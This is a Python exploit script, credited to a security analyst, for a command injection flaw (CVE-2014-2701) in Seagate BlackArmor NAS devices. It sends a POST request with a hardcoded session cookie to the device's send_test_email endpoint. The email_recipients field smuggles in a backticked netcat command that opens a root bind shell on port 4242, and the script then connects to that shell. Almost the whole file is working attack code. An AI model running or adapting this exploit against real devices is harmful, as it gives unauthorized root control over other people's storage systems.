#!/usr/bin/env python

from time import sleep
from sys import exit
import urllib2, signal, os

# [*] Title: Seagate BlackArmor Remote Root Exploit - Command Injection
# [*] Discovered/Exploited By: Jacob Holcomb/Gimppy - Security Analyst @ ISE 
# [*] Contact: Twitter - @rootHak42
# [*] Model: STBN4000100
# [*] Software: httpd (Listens on TCP/80 and TCP/443)
# [*] CVE: Seagate BlackArmor Command Injection: CVE-2014-2701
#



def targURL():

	while True:
	
		URL = raw_input("\n[*] Please enter the URL of the router. Ex. http://192.168.1.1\n>")
		if len(URL) != 0 and URL[0:7] == "http://" or URL[0:8] == "https://":
			return URL.lower()
		else:
			print "\n\n [!!!] Target URL cant be null and must contain http:// or https:// [!!!]\n"
			sleep(1)


def sigHandle(signum, frm): # Signal handler
     
    print "\n\n[!!!] Cleaning up the exploit... [!!!]\n"
    sleep(1)
    exit(0)


def main():

	print "\n[*] Seagate Black Armor Remote Root Shell Exploit\n[*] Exploited By: Jacob Holcomb/Gimppy/@rootHak42"
	signal.signal(signal.SIGINT, sigHandle) #Setting signal handler for ctrl + c
	target = targURL()
	
	if target[0:8] == "https://":
		shell_cmd = "nc -nv %s 4242" % target[8:]
	elif target[0:7] == "http://":
		shell_cmd = "nc -nv %s 4242" % target[7:]

	shell = "nc -llp 4242 -e /bin/sh"
	postData = "email_recipients=%3Crecipients%3E%3Crecipient%3E%3Cemail%3E`{0}`".format(shell)
	postData += "%3C%2Femail%3E%3C%2Frecipient%3E%3C%2Frecipients%3E"

	perm_auth = "ci_session=AzQCaQcwUT9SKwNxAG0IO1hkVW9QJl4mBjcMLQUkBjpXO1Y5AQtUOlZkBnUEP1J1AztRY1E0BDxdcwc0Xz9bMQBtUDIENw45AGZXZV"
	perm_auth += "dgAjADYwJjB2JRMFJgAzIAZwg%2FWGRVNlAyXmYGYww9BWAGMldlVjQBYFRjVmUGdQQ%2FUnUDO1FhUTYEPF1zB25fe1sPADVQZgQyDikAZlclV3"
	perm_auth += "ECJwNuAiAHPVE0UmMDOAB1CDtYbVVnUCpeZAZkDGYFeQZiV3pWZgFjVGRWIgZsBHdSPAMwUWBRPAQkXSQHdF9uWyIAC1BjBDEOPgBtVyJXIAI%2B"
	perm_auth += "AyYCaQc%2FUTRSagMgABoIZVguVTxQaF45BjMMcQViBn1XZFZ3AXxUC1YxBmYEP1ImA01ROVFoBHNdKQcnX2JbZgBsUDQEbQ57AHFXIFc4AjcDZw"
	perm_auth += "J9BzdRLFJwA0UAMghpWD9VOlArXmcGYgxvBWcGY1dlVmcBZVRzVkYGPgR2UmMDZ1E%2FUX4EKV1jBzVfJVtgAHRQSwQ1Dj4AdFczV2MCdgMwAj8H"
	perm_auth += "KFE3UmIDLABnCChYb1UmUD5eZAZhDGQFdQY%2FVzVWJAEgVAxWYQY0BHBSbwN3UTlRcgR%2FXXMHPF9iW2oAZVAxBG8OagA0V2dXMAIzA2UCawc8"
	perm_auth += "UXZSagM7AG0IKFghVSZQYV4nBg0MOgU2BidXNVZ1AW9UIFY6BmcEPlIkAyNRa1F1BDxdaQc9XylbJQAnUGcEJA41AGJXO1dnAicDbgIgBz1RMFJq"
	perm_auth += "AyAANghuWDlVPFBqXncGaQwtBW0Ga1duVnUBPVQgVl8GNgRgUmsDaFE%2BUSQEPV0iBz1fOFtqAHZQewQzDigAIVdtV38%3D"

	try:
		print "\n [*] Preparing the malicious web request."
		httpRequest = urllib2.Request("%s/index.php/mv_system/send_test_email" % target, data = postData)
		httpRequest.add_header("Cookie", perm_auth)
		httpRequest.add_header("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
		httpRequest.add_header("Accept", "application/xml, text/xml, */*; q=0.01")
		httpRequest.add_header("DNT", "1")
		httpRequest.add_header("X-Requested-With", "XMLHttpRequest")
		httpRequest.add_header("Accept-Encoding", "gzip, deflate")
		httpRequest.add_header("Accept-Language", "en-US,en;q=0.5")
		httpRequest.add_header("Connection", "keep-alive")
		httpRequest.add_header("Pragma", "no-cache")
		httpRequest.add_header("Cache-Control", "no-cache")
		httpRequest.add_header("User-Agent", "Mozilla/5.0 (X11; Linux i686; rv:22.0) Gecko/20100101 Firefox/22.0 Iceweasel/22.0")
			
	except Exception as error:
		print "\n [!!!] ERROR! %s %s [!!!]\n\n" % (type(error), error)
		exit(0)

	try:
		print " [*] Sending r00t exploit \n"
		sploit = urllib2.urlopen(httpRequest, None, 6)

	except(urllib2.URLError) as error:
		print "\n [!!!] Web request error! %s %s [!!!]\n\n" % (type(error), error)
		exit(0)
	except Exception as error:
		print "\n [!!!] ERROR! %s %s [!!!]\n" % (type(error), error)
		exit(0)
	finally:
		print " [*] Connecting to r00t shell!!!\n [*] Seagate BlackArmor exploit code has finished.\n"
		os.system(shell_cmd)

if __name__ == "__main__":
	main()	
